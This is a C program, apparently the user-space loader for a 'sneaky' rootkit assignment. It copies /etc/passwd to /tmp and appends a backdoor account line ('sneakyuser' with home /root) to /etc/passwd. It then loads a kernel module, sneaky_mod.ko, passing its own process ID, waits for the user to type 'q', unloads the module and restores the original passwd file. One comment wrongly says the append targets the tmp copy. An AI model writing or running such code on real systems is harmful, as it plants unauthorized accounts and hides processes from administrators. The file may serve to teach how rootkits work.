#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>


int main(void){
  //Copies the /../etc/passwd file to /../tmp/passwd and                                                                                                                                                  
  //stores its return value in sysReturn                                                                                                                                                                  
  int sysReturn = system("cp /../etc/passwd /../tmp/passwd");
  if(sysReturn == -1){
    perror("system() failed");
  }
  
  //Appends the user information to the passwd file in tmp                                                                                                                                                
  sysReturn = system("echo sneakyuser:abc123:2000:2000:sneakyuser:/root:bash >> /../etc/passwd");
  if(sysReturn == -1){
    perror("system() failed");
  }
  
  //Passing PID to and loading kernel module                                                                                                                                                              
  int parentPid  = getpid();
  printf("sneaky_process pid=%d\n", parentPid);
  int pid = fork();
  if(pid == 0){
    
    char pidStr[100];
    sprintf(pidStr, "sneaky_pid=%d", parentPid);
    char * args[] = {"insmod", "sneaky_mod.ko", pidStr, NULL};
    execvp("insmod", args);
    perror("Execvp failed\n");
    return EXIT_SUCCESS;
  }
  else{
    int t;
    waitpid(pid,&t, 0);
  }
  
  
  //Waits for user to type q and press ENTER                                                                                                                                                              
  int quit = 0;;
  int x;
  while(quit == 0){
    x = getchar();
    if(x == 'q'){
      quit = 1;
    }
  }
  
  //Unloads the Kernel Module                                                                                                                                                                             
  pid = fork();
  if(pid == 0){
    char * args[] = {"rmmod","sneaky_mod.ko", NULL};
    execvp("rmmod", args);
    perror("Execvp failed\n");
    return EXIT_SUCCESS;
  }
  else{
    int t;
    waitpid(pid,&t, 0);
  }

  //Restores the /../tmp/passwd file                                                                                                                                                                      
  sysReturn = system("cp /../tmp/passwd /../etc/passwd");
  if(sysReturn == -1){
    perror("system() failed");
  }
  
  //Removes the copy of the /,,/etc/passwd file                                                                                                                                                           
  sysReturn = system("rm /../tmp/passwd");
  if(sysReturn == -1){
    perror("system() failed");
  }
  return EXIT_SUCCESS;
}

